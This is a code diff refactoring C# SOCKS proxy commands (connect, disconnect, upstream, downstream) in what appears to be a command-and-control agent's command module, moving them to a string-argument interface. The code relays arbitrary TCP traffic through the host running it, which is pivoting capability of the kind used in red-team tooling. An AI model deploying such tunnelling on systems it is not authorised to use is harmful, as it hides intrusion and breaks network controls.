@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.Sockets;
@@ -13,16 +14,18 @@ namespace Dots.Commands
     {
         public override string Name => "socks_connect";
 
-        public override void Execute(TaskRequest task, DotsProperties dotsProperty)
+        public override DotsProperties DotsProperty { get; set; }
+
+        public override string Execute(string[] args)
         {
             Socket remote = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
             int rep;
-            var socksClientId = task.Params[2];
-            var atype = task.Params[3];
+            var socksClientId = args[2];
+            var atype = args[3];
 
             try
             {
-                remote.Connect(task.Params[0], int.Parse(task.Params[1]));
+                remote.Connect(args[0], int.Parse(args[1]));
                 rep = 0;
             }
             catch (SocketException e)
@@ -46,7 +49,7 @@ namespace Dots.Commands
                         break;
                 }
 
-                SetupResult(task, JsonSerializer.Serialize(new
+                return JsonSerializer.Serialize(new
                 {
                     remote = (object)null,
                     socks_client_id = socksClientId,
@@ -54,16 +57,15 @@ namespace Dots.Commands
                     atype,
                     bind_addr = (object)null,
                     bind_port = (object)null
-                }));
-                return;
+                });
             }
 
             var bindAddr = ((IPEndPoint)remote.LocalEndPoint).Address.ToString();
             var bindPort = ((IPEndPoint)remote.LocalEndPoint).Port.ToString();
 
-            int remote_key = dotsProperty.AddRemote(remote);
+            int remote_key = DotsProperty.AddRemote(remote);
 
-            SetupResult(task, JsonSerializer.Serialize(new
+            return JsonSerializer.Serialize(new
             {
                 remote = remote_key.ToString(),
                 socks_client_id = socksClientId,
@@ -71,80 +73,81 @@ namespace Dots.Commands
                 atype,
                 bind_addr = bindAddr,
                 bind_port = bindPort
-            }));
+            });
         }
     }
     public class SocksDisconnect : DotsCommand
     {
         public override string Name => "socks_disconnect";
-
-        public override void Execute(TaskRequest task, DotsProperties dotsProperty)
+        public override DotsProperties DotsProperty { get; set; }
+        public override string Execute(string[] args)
         {
-            if(int.TryParse(task.Params[0], out int index))
+            if(int.TryParse(args[0], out int index))
             {
-                Socket remote = dotsProperty.Remotes[index];
+                Socket remote = DotsProperty.Remotes[index];
                 remote.Close();
             } else
             {
                 throw new ArgumentException($"Invalid remote index {index}");
             }
-            SetupResult(task, "Closed remote socket");
+            return "Closed remote socket";
         }
     }
 
     public class SocksDownstream : DotsCommand
     {
         public override string Name => "socks_downstream";
+        public override DotsProperties DotsProperty { get; set; }
 
-        public override void Execute(TaskRequest task, DotsProperties dotsProperty)
+        public override string Execute(string[] args)
         {
             Socket remote;
-            if (!int.TryParse(task.Params[0], out int index))
+            if (!int.TryParse(args[0], out int index))
             {
                 throw new ArgumentException($"Invalid remote index {index}");
             }
-            remote = dotsProperty.Remotes[index];
+            remote = DotsProperty.Remotes[index];
             List<byte> downstreamData = new List<byte>();
-            string socksClientId = task.Params[1];
+            string socksClientId = args[1];
 
-            if(!remote.Poll(0, SelectMode.SelectRead))
+            if (!remote.Poll(0, SelectMode.SelectRead))
             {
-                SetupResult(task, JsonSerializer.Serialize(new
+                return JsonSerializer.Serialize(new
                 {
                     remote = index.ToString(),
                     socks_client_id = socksClientId,
                     downstream_data = Convert.ToBase64String(downstreamData.ToArray())
-                }));
-                return;
+                });
             }
             byte[] buffer = new byte[4096];
             int bytesRead = remote.Receive(buffer);
             downstreamData.AddRange(buffer.Take(bytesRead));
             string downstreamDataString = Convert.ToBase64String(downstreamData.ToArray());
-            SetupResult(task, JsonSerializer.Serialize(new
+            return JsonSerializer.Serialize(new
             {
                 remote = index.ToString(),
                 socks_client_id = socksClientId,
                 downstream_data = downstreamDataString
-            }));
+            });
         }
     }
 
     public class SocksUpstream : DotsCommand
     {
         public override string Name => "socks_upstream";
+        public override DotsProperties DotsProperty { get; set; }
 
-        public override void Execute(TaskRequest task, DotsProperties dotsProperty)
+        public override string Execute(string[] args)
         {
             Socket remote;
-            if (!int.TryParse(task.Params[0], out int index))
+            if (!int.TryParse(args[0], out int index))
             {
                 throw new ArgumentException($"Invalid remote index {index}");
             }
-            remote = dotsProperty.Remotes[index];
-            byte[] upstreamData = Convert.FromBase64String(task.Params[1]);
+            remote = DotsProperty.Remotes[index];
+            byte[] upstreamData = Convert.FromBase64String(args[1]);
             remote.Send(upstreamData);
-            SetupResult(task, "sent succesfully");
+            return "sent succesfully";
         }
     }
 }
